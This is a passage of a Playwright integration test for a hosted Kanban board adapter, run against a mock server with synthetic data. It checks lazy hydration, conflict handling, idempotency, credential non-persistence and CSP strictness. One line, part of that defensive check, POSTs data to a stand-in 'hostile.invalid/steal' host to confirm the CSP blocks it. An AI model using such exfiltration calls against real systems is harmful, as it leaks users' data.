'use strict';
const assert = require('node:assert/strict');
const http = require('node:http');
const fs = require('node:fs');
const path = require('node:path');
const { chromium } = require('playwright');
const { HostedAdapter } = require('../../board/storage-hosted.js');
const ROOT = path.resolve(__dirname, '../..');
const BOARD = '30000000-0000-4000-8000-000000000001';
const ACTOR = { user_id: '10000000-0000-4000-8000-000000000001', agent_id: null };
const TOKEN = 'synthetic-hosted-jwt-never-to-github';
const clone = x => JSON.parse(JSON.stringify(x));
const FIXTURE_FILES = {"tasks.json": {"version": 4, "layout": "split", "next_num": 900000, "columns": [{"id": "backlog", "name": "Backlog"}, {"id": "todo", "name": "To do"}, {"id": "in-progress", "name": "In progress"}, {"id": "pending-review", "name": "Pending review"}, {"id": "done", "name": "Done"}], "people": [{"github": "synthetic-a", "name": "Example A"}, {"github": "synthetic-b", "name": "Example B"}], "settings": {"max_agent_claims": 2, "stale_after_minutes": 30, "review_inbox": {"enabled": true}}, "archive": {"files": {"2025": {"tasks": 1, "contacts": 0}}}, "x-synthetic": {"absent-is-not-null": null, "ordered": [2, 1]}, "x-keeptrack-hosted-attribution": {"version": 1, "records": {"cards/t_sample.json#": {"createdBy": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}, "updatedBy": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}}, "archive/2025.json#/tasks/0": {"createdBy": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}, "updatedBy": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}, "on_behalf_of": "10000000-0000-4000-8000-000000000002"}, "archive/2025.json#/tasks/0/comments/0": {"createdBy": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}, "updatedBy": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}, "on_behalf_of": "10000000-0000-4000-8000-000000000002"}}, "changes": [{"actor": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}, "command": "claim", "at": "2026-01-02T03:04:05.000+00:00", "on_behalf_of": "10000000-0000-4000-8000-000000000002", "paths": ["archive/2025.json"]}]}}, "cards/t_sample.json": {"id": "t_sample", "num": 17, "title": "Synthetic contract sample", "column": "backlog", "rank": "a0", "details": "Only invented content.", "assignees": ["synthetic-a"], "todos": [{"id": "d_one", "text": "Check synthetic example", "done": false}], "links": [], "contacts": ["p_sample"], "project": "pr_sample", "value": 4, "effort": "M", "created": "2026-01-02T03:04:05.000+00:00", "updated": "2026-01-02T03:04:05.000+00:00", "comments": [{"id": "c_one", "text": "Invented comment", "by": "example-agent@synthetic-a", "at": "2026-01-02T03:04:05.000+00:00", "actor": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}}], "history": [{"at": "2026-01-02T03:04:05.000+00:00", "by": "example-agent@synthetic-a", "text": "Created", "actor": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}}], "x-sample": {"null": null, "ordered": [3, 1, 2]}}, "people/p_sample.json": {"id": "p_sample", "name": "Synthetic Person", "company": "Example Company", "stage": "New", "next": "Review invented material", "next_due": "2026-02-01", "links": [], "comments": [], "history": [], "x-sample": null}, "projects/pr_sample.json": {"id": "pr_sample", "name": "Synthetic Project", "client": "Example Company", "people": ["p_sample"], "status": "active", "links": []}, "proposals/r_sample.json": {"id": "r_sample", "version": 1, "kind": "task.create", "status": "pending", "title": "Synthetic proposal", "action_key": "synthetic-action", "work_key": "synthetic-work", "change": {"title": "Invented task"}, "target": null, "decision": null, "history": [], "createdBy": "legacy-example"}, "archive/2025.json": {"version": 3, "archive": true, "year": "2025", "tasks": [{"id": "t_old", "num": 2, "title": "Synthetic contract sample", "column": "done", "rank": "a0", "details": "Only invented content.", "assignees": ["synthetic-a"], "todos": [], "links": [], "contacts": [], "project": "", "value": 4, "effort": "M", "created": "2026-01-02T03:04:05.000+00:00", "updated": "2026-01-02T03:04:05.000+00:00", "comments": [{"id": "c_old", "text": "Archived invented comment", "at": "2026-01-02T03:04:05.000+00:00", "actor": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}, "on_behalf_of": "10000000-0000-4000-8000-000000000002"}], "history": [], "x-sample": {"null": null, "ordered": [3, 1, 2]}}], "contacts": [], "history": {"t_old": [{"at": "2026-01-02T03:04:05.000+00:00", "text": "Old history", "actor": {"user_id": "10000000-0000-4000-8000-000000000001", "agent_id": "20000000-0000-4000-8000-000000000001"}, "on_behalf_of": "10000000-0000-4000-8000-000000000002"}]}, "x-preserve": {"empty": [], "null": null}}};
let files, revs, version, calls, receipts, conflict, lockRetry, denyApprove, omit, changed, expired;
function reset() { files = clone(FIXTURE_FILES); revs = Object.fromEntries(Object.keys(files).map(p => [p, 'r1-' + p])); version = 1; calls = []; receipts = new Map(); conflict = lockRetry = denyApprove = changed = expired = false; omit = true; }
reset();
// Enough omitted cards to expose accidental fan-out, without using real board data.
for (let i = 0; i < 299; i++) {
  const p = `cards/t_lazy_${i}.json`;
  files[p] = { ...clone(FIXTURE_FILES['cards/t_sample.json']), id: `t_lazy_${i}`, num: 1000 + i, title: `Synthetic lazy card ${i}` };
  revs[p] = 'r1-' + p;
}
files['cards/t_lazy_3.json'].related = [{ id: 't_lazy_4', kind: 'related', status: 'possible' }];
files['cards/t_lazy_4.json'].related = [{ id: 't_lazy_3', kind: 'related', status: 'possible' }];
files['cards/t_lazy_298.json'].comments[0].text = 'uniquelazycommentneedle';
const cardReads = () => calls.filter(c => c.url.includes('/files/cards%2F'));
async function hydrationSafetyChecks() {
  const a = new HostedAdapter({ api: 'http://127.0.0.1', board: BOARD });
  const lazy = p => ({ body: { id: p.slice(6, -5), title: 'Captured title' }, rev: 'captured', omitted: ['history', 'comments'] });
  const seed = () => new Map([['tasks.json', { body: { version: 4 } }], ...['cards/a.json', 'cards/b.json', 'cards/untouched.json'].map(p => [p, lazy(p)])]);
  a.files = seed(); let reads = [], fail = false, newer = false;
  a.request = async (method, route) => {
    const p = decodeURIComponent(route.split('/files/')[1]); reads.push(p);
    if (fail && p === 'cards/b.json') throw new Error('Synthetic read failure');
    return { rev: newer ? 'newer' : 'captured', body: { id: p.slice(6, -5), title: 'Captured title', history: [{ text: 'Preserved audit' }], comments: [{ text: 'Preserved comment' }] } };
  };
  const captured = a.files; fail = true;
  await assert.rejects(a.hydrate(['cards/a.json', 'cards/b.json']), /Synthetic read failure/);
  assert.equal(a.files, captured, 'failed batch leaves the captured map intact');
  assert.deepEqual(a.files.get('cards/a.json'), lazy('cards/a.json'), 'no partial hydration is published');
  fail = false; newer = true;
  await assert.rejects(a.hydrate(['cards/b.json']), e => e.status === 412);
  assert.equal(a.files, captured, 'a newer full read cannot replace captured older state');
  newer = false; reads = [];
  await a.hydrate(['cards/a.json', 'cards/b.json']);
  assert.deepEqual(reads, ['cards/b.json'], 'successful reads are reused when retrying an atomic batch');
  assert.equal(a.files.get('cards/untouched.json').omitted.length, 2);
  assert.equal(a.files.get('cards/a.json').body.history[0].text, 'Preserved audit');
  // A poll/snapshot winning the race must survive an older read completing later.
  a.files = seed(); let complete;
  a.request = () => new Promise(resolve => { complete = resolve; });
  const pending = a.hydrate(['cards/a.json']);
  const current = new Map(a.files); current.set('cards/a.json', { ...lazy('cards/a.json'), rev: 'polled' }); a.files = current;
  complete({ rev: 'captured', body: { id: 'a', history: [], comments: [] } });
  await assert.rejects(pending, e => e.status === 412);
  assert.equal(a.files, current, 'late hydration never overwrites a newer captured revision');
}
const file = p => ({ path: p, body: clone(files[p]), rev: revs[p], createdBy: ACTOR, updatedBy: ACTOR });
function snapshot() {
  const root = file('tasks.json'); delete root.path;
  const entities = Object.keys(files).filter(p => /^(cards|people|projects|proposals)\//.test(p)).map(p => {
    const e = file(p); delete e.path; e.kind = { cards: 'card', people: 'person', projects: 'project', proposals: 'proposal' }[p.split('/')[0]];
    if (omit && e.kind === 'card') { e.omitted = ['history', 'comments']; delete e.body.history; delete e.body.comments; } return e;
  });
  return { schema: 4, board_id: BOARD, root, entities, claims: [], cursor: 'c' + version,
    capabilities: { casWrites: true, atomicMultiFile: true, changeFeed: true, phase: '0', lazyHistory: omit, teamDocuments: true,
      commands: ['create-card', 'claim', 'heartbeat', 'release', 'move', 'done', 'review', 'archive', 'unarchive', 'approve', 'comment'] } };
}
const server = http.createServer(async (req, res) => {
  const u = new URL(req.url, 'http://local');
  if (req.headers.origin && /^http:\/\/(127\.0\.0\.1|localhost):\d+$/.test(req.headers.origin)) {
    res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
    res.setHeader('Access-Control-Allow-Headers', 'authorization, content-type, apikey, idempotency-key');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  }
  if (req.method === 'OPTIONS') { res.writeHead(204).end(); return; }
  const send = (body, status = 200) => { res.writeHead(status, { 'Content-Type': 'application/json', 'Cache-Control': 'no-store' }); res.end(JSON.stringify(body)); };
  const error = (code, status) => send({ error: { code, message: 'Synthetic refusal', request_id: 'test', retryable: code === 'lock_retry' } }, status);
  if (u.pathname.startsWith('/v1/') || u.pathname.startsWith('/auth/')) {
    let raw = ''; for await (const chunk of req) raw += chunk;
    const body = raw ? JSON.parse(raw) : undefined; calls.push({ method: req.method, url: req.url, headers: req.headers, body });
    if (u.pathname === '/auth/v1/token') return send({ access_token: TOKEN, refresh_token: 'must-not-persist' });
    if (expired) return error('invalid_credential', 401);
    assert.equal(req.headers.authorization, 'Bearer ' + TOKEN);
    if (u.pathname === '/v1/me') return send({ ...ACTOR, boards: [{ id: BOARD, role: 'editor', handle: 'synthetic-a' }], token_scopes: ['read', 'write', 'claim'] });
    const suffix = u.pathname.replace('/v1/boards/' + BOARD, '');
    if (suffix === '/snapshot') return send(snapshot());
    if (suffix.startsWith('/files/')) { const p = decodeURIComponent(suffix.slice(7)); return files[p] ? send(file(p)) : error('not_found', 404); }
    if (suffix === '/changes') {
      const delta = { resource: 'file', path: 'cards/t_sample.json', rev: revs['cards/t_sample.json'], op: 'upsert', body: clone(files['cards/t_sample.json']) };
      if (omit) { delta.omitted = ['history', 'comments']; delete delta.body.history; delete delta.body.comments; }
      const batches = changed ? [{ cursor: 'c' + version, changes: [delta] }] : [];
      changed = false; return send({ through: 'c' + version, has_more: false, batches });
    }
    if (req.method === 'POST') {
      const key = req.headers['idempotency-key']; assert.match(key, /^[\da-f-]{36}$/);
      if (receipts.has(key)) return send(receipts.get(key));
      if (lockRetry) { lockRetry = false; return error('lock_retry', 503); }
      if (conflict) { conflict = false; files['cards/t_sample.json'].title = 'Their changed title'; revs['cards/t_sample.json'] = 'concurrent-r2'; return error('revision_conflict', 412); }
      const updates = []; let result;
      if (suffix === '/commits') {
        for (const op of body.ops) {
          if (op.kind === 'create-card') {
            assert.equal(op.card.num, undefined); assert.equal(op.card.column, 'backlog');
            const card = { ...op.card, num: files['tasks.json'].next_num++ };
            const created = 'cards/' + card.id + '.json'; files[created] = card; revs[created] = 'new-' + ++version;
            revs['tasks.json'] = 'root-' + version; updates.push({ path: created, rev: revs[created] }); continue;
          }
          if (op.baseRev !== revs[op.path]) return error('revision_conflict', 412);
          assert.deepEqual(op.body.history, files[op.path].history, 'replacement preserves omitted history');
          assert.deepEqual(op.body.comments, files[op.path].comments, 'replacement preserves omitted comments');
          files[op.path] = clone(op.body); revs[op.path] = 'r' + ++version + '-' + op.path; updates.push({ path: op.path, rev: revs[op.path] });
        }
      } else if (suffix === '/commands') {
        if (body.kind === 'approve' && denyApprove) return error('insufficient_scope', 403);
        if (body.kind === 'create-card') {
          assert.equal(body.card.num, undefined); const c = { ...body.card, num: files['tasks.json'].next_num++ };
          files['cards/' + c.id + '.json'] = c; revs['cards/' + c.id + '.json'] = 'new'; result = { card_id: c.id, num: c.num };
        } else if (body.kind === 'archive') {
          const p = 'cards/' + body.entity_id + '.json', a = 'archive/' + body.year + '.json';
          assert.equal(body.baseRev, revs[p]); assert.equal(body.rootRev, revs['tasks.json']);
          assert.equal(body.archiveRev, revs[a] || null);
          files[a] ||= { version: 3, archive: true, year: body.year, tasks: [], contacts: [], history: {} };
          files[a].tasks.push(files[p]); delete files[p]; delete revs[p];
          revs[a] = 'archive-' + (version + 1); revs['tasks.json'] = 'root-' + (version + 1);
          files['tasks.json'].archive.files[body.year] = { tasks: files[a].tasks.length, contacts: 0 };
          result = { entity_id: body.entity_id, year: body.year };
        } else if (body.kind === 'comment') {
          files['cards/' + body.card_id + '.json'].comments.push({ id: 'c_new', text: body.text, by: 'synthetic-a', actor: ACTOR, at: '2026-10-15T12:00:00Z' });
          result = { comment_id: 'c_new', actor: ACTOR, at: '2026-10-15T12:00:00Z' };
        } else {
          const card = files['cards/' + body.card_id + '.json']; card.column = body.kind === 'approve' ? 'todo' : body.column;
          result = { card_id: body.card_id, column: card.column, claim_ended: false };
        }
        version++;
      } else return error('not_found', 404);
      const response = { cursor: 'c' + version, files: updates, ...(result ? { result } : {}) }; receipts.set(key, response); return send(response);
    }
    return error('not_found', 404);
  }
  const rel = decodeURIComponent(u.pathname).replace(/^\/+/, '') || 'board/index.html';
  const target = path.resolve(ROOT, rel); if (!target.startsWith(ROOT + path.sep)) { res.writeHead(403).end(); return; }
  fs.readFile(target, (e, data) => { if (e) res.writeHead(404).end(); else { res.setHeader('Content-Type', { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.json': 'application/json', '.svg': 'image/svg+xml' }[path.extname(target)] || 'application/octet-stream'); res.end(data); } });
});
(async () => {
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve)); const base = 'http://127.0.0.1:' + server.address().port;
  const browser = await chromium.launch({ headless: true }); let passed = 0;
  const ok = name => { passed++; console.log('PASS ' + name); };
  try {
    await hydrationSafetyChecks(); ok('targeted batches are atomic, preserve captured state on failure and reject newer or superseded revisions');
    const page = await browser.newPage(); const errors = [], github = [];
    page.on('pageerror', e => errors.push(e.message));
    page.on('request', req => { const host = new URL(req.url()).hostname; if (/(^|\.)(github\.com|githubusercontent\.com|githubassets\.com)$/.test(host)) github.push({ url: req.url(), headers: req.headers(), body: req.postData() }); });
    await page.route('https://api.github.com/**', r => r.abort());
    await page.addInitScript(() => { window.__normalCsp = []; document.addEventListener('securitypolicyviolation', e => window.__normalCsp.push({ directive: e.effectiveDirective, blocked: e.blockedURI })); localStorage.setItem('kb_token', 'existing-github-secret'); localStorage.setItem('kb_repo', 'acme/board'); localStorage.setItem('kb_me', 'forged'); localStorage.setItem('kb_view', 'board'); sessionStorage.setItem('kb_view', 'board'); });
    await page.goto(`${base}/board/hosted.html?backend=hosted&api=${encodeURIComponent(base)}&board=${BOARD}`);
    await page.locator('#hostedSignIn').waitFor();
    assert.equal(await page.locator('#hostedAuth').inputValue(), base, 'sign-in defaults to the configured API origin');
    const firstPolicy = await page.locator('head > meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
    assert.match(firstPolicy, /script-src 'self'; style-src 'self'/);
    assert.match(firstPolicy, /connect-src 'self';/);
    assert.ok(!/blob:|unsafe-inline|unsafe-eval/.test(firstPolicy));
    assert.equal(calls.length, 0, 'hosted boot does not read GitHub or private data before sign-in');
    await page.locator('#hostedKey').fill('synthetic-publishable'); await page.locator('#hostedEmail').fill('synthetic@example.test'); await page.locator('#hostedPassword').fill('synthetic-password'); await page.locator('#hostedSignIn').click();
    await page.getByText('Synthetic contract sample', { exact: true }).first().waitFor();
    assert.ok(calls.some(c => c.url === '/v1/me'));
    assert.equal(Object.keys(files).filter(p => p.startsWith('cards/')).length, 300);
    assert.ok(await page.locator('.card').count() > 0);
    assert.equal(cardReads().length, 0, '300-card load never requests omitted histories');
    files['cards/t_sample.json'].details = 'Closed drawer poll'; revs['cards/t_sample.json'] = 'closed-poll'; version++; changed = true;
    await page.waitForFunction(() => document.querySelector('.card')?.textContent && document.getElementById('status').textContent.startsWith('Synced'));
    await page.waitForResponse(r => r.url().includes('/changes?after='));
    assert.equal(cardReads().length, 0, 'polling with the drawer closed never hydrates cards');
    await page.locator('.col[data-col="in-progress"] .cards').evaluate(col => {
      const dataTransfer = new DataTransfer(); dataTransfer.setData('text/plain', 't_lazy_0');
      col.dispatchEvent(new DragEvent('drop', { bubbles: true, cancelable: true, dataTransfer }));
    });
    await page.waitForFunction(() => document.getElementById('status').textContent.startsWith('Saved'));
    assert.equal(files['cards/t_lazy_0.json'].column, 'in-progress');
    assert.deepEqual(cardReads().map(c => c.url.split('/files/')[1]), ['cards%2Ft_lazy_0.json'], 'drag hydrates exactly the moved card');
    assert.deepEqual(files['cards/t_lazy_0.json'].history, FIXTURE_FILES['cards/t_sample.json'].history);
    ok('drag hydrates exactly one captured card and preserves its omitted fields');
    const commandsBeforeRefusal = calls.filter(c => c.url.endsWith('/commands')).length;
    await page.route('**/files/cards%2Ft_lazy_1.json', route => route.fulfill({ json: { ...file('cards/t_lazy_1.json'), rev: 'unexpected-newer', body: { title: 'Must not replace captured title' } } }));
    await page.locator('.col[data-col="in-progress"] .cards').evaluate(col => {
      const dataTransfer = new DataTransfer(); dataTransfer.setData('text/plain', 't_lazy_1');
      col.dispatchEvent(new DragEvent('drop', { bubbles: true, cancelable: true, dataTransfer }));
    });
    await page.waitForFunction(() => document.getElementById('status').textContent.includes('revision_conflict'));
    assert.equal(calls.filter(c => c.url.endsWith('/commands')).length, commandsBeforeRefusal, 'hydration revision mismatch prevents mutation');
    assert.equal(files['cards/t_lazy_1.json'].column, 'backlog');
    await page.getByText('Synthetic lazy card 1', { exact: true }).first().waitFor();
    await page.unroute('**/files/cards%2Ft_lazy_1.json');
    ok('mutation rejects a newer full read and keeps captured card state without posting');
    const drawerReadsBefore = cardReads().length;
    await page.locator('#btnFilter').click(); await page.locator('#sortMenu').selectOption('newest');
    await page.locator('#btnFilter').click();
    assert.equal(new URL(page.url()).searchParams.get('api'), base, 'filter routing retains hosted endpoint');
    assert.equal(new URL(page.url()).searchParams.get('board'), BOARD);
    ok('300-card load and closed-drawer polling render with zero history reads');

    let releaseDrawer;
    const drawerGate = new Promise(resolve => { releaseDrawer = resolve; });
    let failDrawer = true, drawerRequests = 0;
    await page.route('**/files/cards%2Ft_sample.json', async route => {
      drawerRequests++; await drawerGate;
      if (failDrawer) await route.fulfill({ status: 500, json: { error: { code: 'synthetic_failure', message: 'Read failed' } } });
      else await route.continue();
    });
    await page.evaluate(() => { location.hash = '#17&comment=c_one'; }); await page.locator('#dlgCard[open]').waitFor();
    await page.getByText('Loading history and comments…', { exact: true }).waitFor();
    assert.equal(await page.locator('#cTitle').inputValue(), 'Synthetic contract sample', 'drawer renders before full read completes');
    releaseDrawer();
    await page.getByText('Could not load history and comments.', { exact: true }).waitFor();
    assert.equal(await page.locator('#cTitle').inputValue(), 'Synthetic contract sample', 'failed drawer hydration preserves captured fields');
    failDrawer = false; await page.locator('#cmStream').getByRole('button', { name: 'Retry', exact: true }).click();
    await page.locator('#cmStream').getByText('Invented comment', { exact: true }).waitFor();
    await page.locator('#cmStream [data-cid="c_one"].cmflash').waitFor();
    const commentLink = new URL(await page.evaluate(() => window.kbNavigation.link()));
    assert.equal(commentLink.searchParams.get('api'), base, 'comment links keep the hosted endpoint');
    assert.equal(commentLink.searchParams.get('board'), BOARD);
    assert.equal(commentLink.hash, '#17&comment=c_one', 'comment focus survives delayed history, a failed read and retry');
    assert.equal(drawerRequests, 2, 'one failed read and one explicit retry');
    await page.unroute('**/files/cards%2Ft_sample.json');
    assert.deepEqual(cardReads().slice(drawerReadsBefore).map(c => c.url.split('/files/')[1]), ['cards%2Ft_sample.json']);
    ok('drawer shows immediately, then hydrates exactly its card with a loading state');
    lockRetry = true;
    await page.locator('#cTitle').fill('My synthetic title'); await page.locator('#cTitle').blur();
    await page.waitForFunction(() => document.getElementById('status').textContent.startsWith('Saved'));
    assert.equal(files['cards/t_sample.json'].title, 'My synthetic title');
    assert.deepEqual(files['cards/t_sample.json'].history, FIXTURE_FILES['cards/t_sample.json'].history);
    assert.ok(calls.some(c => c.url.endsWith('/commits') && c.body.ops[0].baseRev));
    const firstPosts = calls.filter(c => c.url.endsWith('/commits'));
    assert.equal(firstPosts.length, 2); assert.equal(firstPosts[0].headers['idempotency-key'], firstPosts[1].headers['idempotency-key']);
    ok('UI field commit carries captured revision, preserves audit/history and reuses its key on 503');

    conflict = true;
    await page.locator('#cTitle').fill('My conflict choice'); await page.locator('#cTitle').blur();
    await page.locator('#dlgConflict[open]').waitFor({ timeout: 10000 });
    await page.locator('#cfBody input[value="mine"]').check(); await page.locator('#cfApply').click();
    await page.waitForFunction(() => document.getElementById('status').textContent.startsWith('Saved'));
    assert.equal(files['cards/t_sample.json'].title, 'My conflict choice');
    const commits = calls.filter(c => c.url.endsWith('/commits')); assert.notEqual(commits.at(-1).headers['idempotency-key'], commits.at(-2).headers['idempotency-key']);
    ok('412 reloads and uses existing conflict choices with a fresh mutation key');

    files['cards/t_sample.json'].details = 'Polled synthetic detail'; revs['cards/t_sample.json'] = 'poll-r3'; version++; changed = true;
    await page.waitForFunction(() => document.getElementById('cDescView').textContent.includes('Polled synthetic detail'), { timeout: 10000 });
    assert.ok(calls.some(c => c.url.includes('/changes?after='))); ok('cursor polling updates the open drawer');

    const adapterResult = await page.evaluate(async ({ base, board }) => {
      const a = new KeeptrackHosted.HostedAdapter({ api: base, board });
      await a.signIn({ auth: base, key: 'synthetic', email: 'synthetic@example.test', password: 'synthetic' }); await a.snapshot();
      const command = { kind: 'comment', card_id: 't_sample', baseRev: a.files.get('cards/t_sample.json').rev, text: 'Replay once' }, key = crypto.randomUUID();
      const first = await a.command(command, key), second = await a.command(command, key); a.logout(); return { first, second, signedIn: a.signedIn, size: a.files.size };
    }, { base, board: BOARD });
    assert.deepEqual(adapterResult.first, adapterResult.second); assert.equal(adapterResult.signedIn, false); assert.equal(adapterResult.size, 0);
    assert.equal(files['cards/t_sample.json'].comments.filter(c => c.text === 'Replay once').length, 1);
    ok('idempotency replay and logout clear adapter state');

    denyApprove = true;
    const refusal = await page.evaluate(async ({ base, board }) => {
      const a = new KeeptrackHosted.HostedAdapter({ api: base, board });
      await a.signIn({ auth: base, key: 'synthetic', email: 'synthetic@example.test', password: 'synthetic' }); await a.snapshot();
      try { await a.command({ kind: 'approve', card_id: 't_sample', baseRev: a.files.get('cards/t_sample.json').rev }, crypto.randomUUID()); }
      catch (e) { return { status: e.status, code: e.code }; }
    }, { base, board: BOARD });
    assert.deepEqual(refusal, { status: 403, code: 'insufficient_scope' }); denyApprove = false;
    const unsafe = await page.evaluate(board => {
      try { new KeeptrackHosted.HostedAdapter({ api: 'https://api.github.com', board }); return false; } catch { return true; }
    }, BOARD);
    assert.equal(unsafe, true); ok('unscoped approval surfaces 403 and GitHub cannot be an API endpoint');

    const leaked = await page.evaluate(async token => {
      const entries = Object.entries(localStorage).concat(Object.entries(sessionStorage));
      const db = await new Promise(resolve => { const r = indexedDB.open('keeptrack', 1); r.onsuccess = () => resolve(r.result); r.onerror = () => resolve(null); r.onupgradeneeded = () => r.result.createObjectStore('kv'); });
      let values = []; if (db) { values = await new Promise(resolve => { const tx = db.transaction('kv'), r = tx.objectStore('kv').getAll(); r.onsuccess = () => resolve(r.result); }); db.close(); }
      return JSON.stringify([entries, values]).includes(token);
    }, TOKEN);
    assert.equal(leaked, false); assert.equal(github.length, 0); ok('X3: no hosted credential in persistence or any GitHub request');


    await page.locator('#cClose').click(); await page.locator('#dlgCard').waitFor({ state: 'hidden' });
    await page.waitForFunction(() => !/^#\d/.test(location.hash));
    const relationReadsBefore = cardReads().length;
    await page.evaluate(() => { const url = new URL(location.href); url.searchParams.delete('card'); history.replaceState(history.state, '', url); location.hash = '#1003'; });
    await page.locator('#dlgCard[open]').waitFor();
    await page.locator('#cmStream').getByText('Invented comment', { exact: true }).waitFor();
    await page.locator('#cRelList [data-act="link"]').click();
    await page.waitForFunction(() => document.getElementById('status').textContent.startsWith('Saved'));
    assert.deepEqual(calls.filter(c => c.url.endsWith('/commits')).at(-1).body.ops.map(op => op.path).sort(), ['cards/t_lazy_3.json', 'cards/t_lazy_4.json']);
    assert.deepEqual([...new Set(cardReads().slice(relationReadsBefore).map(c => c.url.split('/files/')[1]))].sort(), ['cards%2Ft_lazy_3.json', 'cards%2Ft_lazy_4.json'], 'two-card save reads only the touched pair');
    assert.deepEqual(files['cards/t_lazy_4.json'].comments, FIXTURE_FILES['cards/t_sample.json'].comments);
    await page.locator('#cClose').click(); await page.locator('#dlgCard').waitFor({ state: 'hidden' });
    ok('multi-card relationship save hydrates only its touched pair and preserves omitted comments');
    const quick = page.locator('.col[data-col="backlog"] .add input');
    await quick.fill('New hosted card'); await quick.press('Enter');
    await page.waitForFunction(() => document.getElementById('status').textContent.startsWith('Saved'));
    const created = Object.values(files).find(x => x.title === 'New hosted card');
    assert.ok(created); assert.equal(created.num, 900000); assert.equal(created.column, 'backlog');
    await page.evaluate(() => { location.hash = '#900000'; }); await page.locator('#dlgCard[open]').waitFor();
    await page.waitForFunction(() => document.getElementById('cTitle').value === 'New hosted card');
    assert.match(await page.evaluate(() => kbNavigation.link()), /#900000$/);
    ok('new UI cards receive server numbers in Backlog, including six-digit deep links');
    await page.locator('#dMore').click();
    await page.locator('.ui-menu').getByRole('menuitem', { name: 'Archive task', exact: true }).click();
    await page.locator('dialog[open]').filter({ hasText: 'Archive this task?' }).getByRole('button', { name: 'Archive task', exact: true }).click();
    await page.waitForFunction(() => !document.getElementById('dlgCard').open);
    assert.equal(files['cards/' + created.id + '.json'], undefined);
    assert.ok(Object.entries(files).some(([p, f]) => p.startsWith('archive/') && f.tasks.some(t => t.id === created.id)));
    assert.deepEqual(await page.evaluate(() => window.__normalCsp), [], 'zero CSP violations through sign-in/load/edit/archive');
    ok('strict hosted entry: sign-in/load/edit/archive without CSP violations');
    await page.evaluate(() => { window.__cspViolations = []; document.addEventListener('securitypolicyviolation', e => window.__cspViolations.push(e.blockedURI)); });
    const hostile = await page.evaluate(async () => { try { await fetch('https://hostile.invalid/steal', { method: 'POST', body: 'synthetic' }); return false; } catch { return true; } });
    assert.equal(hostile, true); assert.ok((await page.evaluate(() => window.__cspViolations)).some(x => x.includes('hostile.invalid'))); ok('actual CSP blocks hostile origins');

    const activityReadsBefore = cardReads().length;
    let releaseActivity;
    const activityGate = new Promise(resolve => { releaseActivity = resolve; });
    await page.route('**/files/cards%2Ft_lazy_298.json', async route => { await activityGate; await route.continue(); });
    await page.evaluate(() => { location.hash = '#view=activity'; });
    await page.locator('#board').getByText('Loading history and comments…', { exact: true }).waitFor();
    releaseActivity(); await page.locator('#board .actbar').waitFor();
    await page.unroute('**/files/cards%2Ft_lazy_298.json');
    assert.ok(cardReads().length - activityReadsBefore > 290, 'activity requests cross-card history only after being opened');
    const searchReadsBefore = cardReads().length;
    await page.evaluate(() => { location.hash = '#search'; }); await page.locator('#qQ').fill('uniquelazycommentneedle');
    await page.locator('#qRes').getByText('Synthetic lazy card 298', { exact: true }).waitFor();
    assert.equal(cardReads().length, searchReadsBefore, 'comment search reuses history already requested by activity');
    await page.locator('#qClose').click();
    ok('activity hydrates across cards on opening and comment search uses the hydrated index');

    await page.locator('#hostedSignOut').click(); await page.locator('#hostedSignIn').waitFor();
    await page.reload(); await page.locator('#hostedSignIn').waitFor();
    assert.equal(await page.locator('#hostedPassword').inputValue(), ''); assert.equal(errors.length, 0, errors.join('\n')); ok('reload requires sign-in and browser has no page errors');
    const second = await browser.newPage();
    await second.addInitScript(() => { window.__normalCsp = []; document.addEventListener('securitypolicyviolation', e => window.__normalCsp.push({ directive: e.effectiveDirective, blocked: e.blockedURI })); sessionStorage.setItem('kb_view', 'board'); localStorage.setItem('kb_layout', 'classic'); });
    const secondBase = base.replace('127.0.0.1', 'localhost');
    await second.goto(`${secondBase}/board/hosted.html?api=${encodeURIComponent(base)}&auth=${encodeURIComponent(base)}&board=${BOARD}`);
    await second.locator('#hostedKey').fill('synthetic'); await second.locator('#hostedEmail').fill('synthetic@example.test'); await second.locator('#hostedPassword').fill('synthetic'); await second.locator('#hostedSignIn').click();
    await second.getByText('My conflict choice', { exact: true }).first().waitFor();
    const policy = await second.locator('head > meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
    const directives = Object.fromEntries(policy.split(';').map(x => x.trim().split(/\s+/)).filter(x => x[0]).map(([k, ...v]) => [k, v]));
    assert.deepEqual(directives['script-src'], ["'self'"]); assert.deepEqual(directives['style-src'], ["'self'"]);
    assert.deepEqual(directives['connect-src'], ["'self'", base]);
    for (const d of ['object-src', 'base-uri', 'frame-src', 'form-action']) assert.deepEqual(directives[d], ["'none'"]);
    assert.ok(!/blob:|unsafe-inline|unsafe-eval/.test(policy));
    await second.evaluate(() => { location.hash = '#17'; }); await second.locator('#dlgCard[open]').waitFor();
    await second.locator('#cTitle').fill('Second origin edit'); await second.locator('#cTitle').blur();
    await second.waitForFunction(() => document.getElementById('status').textContent.startsWith('Saved'));
    assert.equal(files['cards/t_sample.json'].title, 'Second origin edit');
    await second.locator('#dMore').click();
    await second.locator('.ui-menu').getByRole('menuitem', { name: 'Archive task', exact: true }).click();
    await second.locator('dialog[open]').filter({ hasText: 'Archive this task?' }).getByRole('button', { name: 'Archive task', exact: true }).click();
    await second.waitForFunction(() => !document.getElementById('dlgCard').open);
    assert.equal(files['cards/t_sample.json'], undefined);
    const rejected = await second.evaluate(async board => {
      const adapter = new KeeptrackHosted.HostedAdapter({ api: new URL(location.href).searchParams.get('api'), board });
